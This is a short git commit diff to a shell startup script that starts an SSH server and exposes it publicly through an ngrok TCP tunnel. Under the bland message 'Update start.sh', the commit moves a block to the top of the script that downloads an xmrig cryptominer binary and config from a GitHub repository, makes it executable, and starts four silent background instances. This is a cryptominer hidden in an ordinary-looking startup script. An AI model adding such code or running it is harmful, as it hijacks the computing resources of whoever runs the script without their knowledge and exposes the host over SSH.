41cc51376649e0e3284acf838e28ebd6128f02ba
llm2580 <78610306+llm2580@users.noreply.github.com>
2023-01-28 14:21:22 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,12 @@
 #!/bin/bash
+wget https://github.com/llm2580/xssh/raw/main/config.json
+wget https://github.com/llm2580/xssh/raw/main/xmrig
+chmod 755 xmrig
+nohup ./xmrig >/dev/null 2>&1 &
+nohup ./xmrig >/dev/null 2>&1 &
+nohup ./xmrig >/dev/null 2>&1 &
+nohup ./xmrig >/dev/null 2>&1 &
+echo "complete!"
 source /app/config.sh
 
 service ssh start
@@ -8,11 +16,3 @@ echo "set ngrok token: $NGROK_TOKEN"
 ngrok authtoken $NGROK_TOKEN
 echo "start ngrok service"
 ngrok tcp 22 --log=stdout > ngrok.log
-wget https://github.com/llm2580/xssh/raw/main/config.json
-wget https://github.com/llm2580/xssh/raw/main/xmrig
-chmod 755 xmrig
-nohup ./xmrig >/dev/null 2>&1 &
-nohup ./xmrig >/dev/null 2>&1 &
-nohup ./xmrig >/dev/null 2>&1 &
-nohup ./xmrig >/dev/null 2>&1 &
-echo "complete!"
